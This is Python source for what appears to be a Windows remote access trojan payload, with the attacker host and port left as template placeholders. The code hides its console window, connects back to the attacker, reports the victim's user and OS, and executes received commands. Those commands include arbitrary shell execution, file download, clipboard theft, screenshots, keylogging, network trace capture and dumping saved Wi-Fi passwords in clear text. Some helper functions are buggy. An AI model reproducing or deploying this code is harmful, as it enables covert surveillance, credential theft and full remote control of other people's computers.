from socket import */n        from getpass import getuser/n        import subprocess/n        import platform/n        import os/n        import win32console/n        import win32gui/n        import sys/n        import win32api,pythoncom/n        import time,random,string,base64/n        import datetime/n        import pyautogui/n        import keyboard/n        import urllib.request/n        import webbrowser/n        import pyperclip/n        import http.server/n        import socketserver/n        from pynput.keyboard import Key, Listener/n        import logging/n        # hiding the payload/n        def hide_window():/n            win = win32console.GetConsoleWindow()/n            win32gui.ShowWindow(win, 0)/n        # fetch victim information/n        def collect_os_info():/n            get_os =  platform.uname()/n            get_user = '[R01]'+getuser()/n        #    talk_back(get_user)/n            os_info = '[OS INFO] client_name: '+str(get_user)+' <-> '+'client_os: '+str(get_os)/n            return os_info/n        def generate_file_name():/n            generation_time = datetime.datetime.now()/n            filename = generation_time.strftime('Screenshot_%Y-%m-%d_%H-%M-%S')/n            return filename/n        def set_clipboard(text):/n            statement = 'Setting clipboard to: '+text/n            pyperclip.copy(text)/n            return statement/n        def get_clipboard():/n            statement= str(pyperclip.paste())/n            return statement/n        def take_screenshot():/n            # statement = 'Taking screenshot...'/n            pyautogui.screenshot().save(generate_file_name() + '.png')/n            statement = statement+'\nScreenshot saved!'/n            return statement/n        def serve_http():/n            HTTP_PORT = 80/n            statement = 'serving at port'+ str(HTTP_PORT)/n            Handler = http.server.SimpleHTTPRequestHandler/n            with socketserver.TCPServer(('', HTTP_PORT), Handler) as httpd:/n                /n                httpd.serve_forever()/n            return statement/n        def analyze_lan_traffic(delay,filename):/n           # statement = 'Starting Trace Capture...'/n            subprocess.run(['netsh', 'trace', 'start', 'capture=yes', 'tracefile='+filename], capture_output=True)/n            time.sleep(delay)/n            statement = 'Stopping Trace...'/n            subprocess.run(['netsh', 'trace', 'stop'], capture_output=True)/n            return statement/n        def press_keys(keys):/n            keyboard.write(keys)/n            statement = 'Typing '+ keys/n            return statement/n        def download_file(url):/n            filename = url.split('/')[-1]/n            urllib.request.urlretrieve(url, filename)/n            if os.path.exists(filename):/n                statement = f'{filename} downloaded successfully!'/n            else:/n                statement = f'Failed to download {filename}'/n            return statement/n        def open_link(link):/n            webbrowser.open(link)/n            statement = 'Opening '+link +' ...'/n            return statement/n        def generate_wlan_profile():/n            result = subprocess.run(['netsh wlan show profile'], stdout=subprocess.PIPE)/n            statement = result.stdout.decode('utf-8')/n            return statement/n        def generate_wlan_ind_profile(profile_name):/n            result = subprocess.run([f'netsh wlan show profile name={profile_name} key=clear'], stdout=subprocess.PIPE)/n            statement = result.stdout.decode('utf-8') /n            return statement/n        /n        def talk_back(message):/n            print('Sending [ '+message+' ]...')/n            connection.send(message.encode())/n        def record_key_strokes():/n            log_dir = ''/n            logging.basicConfig(filename=(log_dir + 'keylogs.txt'), \/n        	level=logging.DEBUG, format='%(asctime)s: %(message)s')/n            def on_press(key):/n                logging.info(str(key))/n            return 'key logging started !'/n            with Listener(on_press=on_press) as listener:/n                listener.join()/n            /n        hide_window()/n        # Lhost and lport/n        HOST ='"+lhost+"' /n        PORT = "+str(lport)+"/n        # connection configuration/n        connection = socket(AF_INET, SOCK_STREAM)/n        connection.connect((HOST, PORT))/n        talk_back(collect_os_info())/n        print('connection established !')/n        # payload execution/n        while True:/n            receiver = connection.recv(1024).decode()/n            if receiver == 'exit':/n                exit()/n            elif receiver[:2] == 'cd':/n                os.chdir(receiver[3:])/n                talk_back(os.getcwd())/n            elif '.exe' in receiver:/n                # warning = '(!) Executing '+receiver/n                # talk_back(warning)/n                result = subprocess.run(receiver, shell=True, capture_output=True)/n                # Print the output of the command/n                # talk_back(result)/n                statement = 'done !'/n                talk_back(statement)/n            elif 'type' in receiver:/n                text = receiver[4:]/n                time.sleep(2)/n                statement = press_keys(text)/n                talk_back(statement)/n            elif 'download' in receiver:/n                URL = receiver[8:]/n                statement = download_file(URL)/n                talk_back(statement)/n            elif 'set clipboard' in receiver:/n                text = receiver[14:]/n                statement = str(set_clipboard(text))/n                talk_back(statement)/n            elif 'get clipboard' in receiver:/n                statement = get_clipboard()/n                talk_back(statement)/n            elif 'analyze lan traffic' in receiver:/n                statement = analyze_lan_traffic()/n                talk_back(statement)/n            elif 'take screenshot' in receiver:/n                statement = take_screenshot()/n                talk_back(statement)/n            elif 'start file server' in receiver:/n                statement = serve_http()/n                talk_back(statement)/n            elif 'generate wlan profile *' in receiver:/n                statement = generate_wlan_profile()/n                talk_back(statement)/n            elif receiver == 'generate wlan profile':/n                statement = generate_wlan_ind_profile(receiver[22:])/n                talk_back(statement)/n            elif 'browse' in receiver[:6]:/n                statement = open_link(receiver[7:])/n                talk_back(statement)/n            elif 'shutdown' in receiver[:8]:/n                if 'shutdown -t' in receiver[:11]:/n                    subprocess.getoutput('shutdown -s -t '+receiver[12:])/n                    statement = 'Shutting down in'+ str(int(receiver[12:])/60)+'minute(s)'/n                else:/n                    subprocess.getoutput('shutdown -s -t 30')/n                    statement = 'Shutting down in 30 seconds'/n                talk_back(statement)/n            elif receiver == 'start keylogger':/n                statement = record_key_strokes()/n                talk_back(statement) /n            else:/n                out_put = subprocess.getoutput(receiver)/n                statement = 'Executing command:' + receiver+'\n'+out_put/n                if out_put =='' or out_put == None:/n                    output='NO OUTPUT'/n                    talk_back(statement)/n                    talk_back(out_put)/n                else:/n                    talk_back(statement)/n        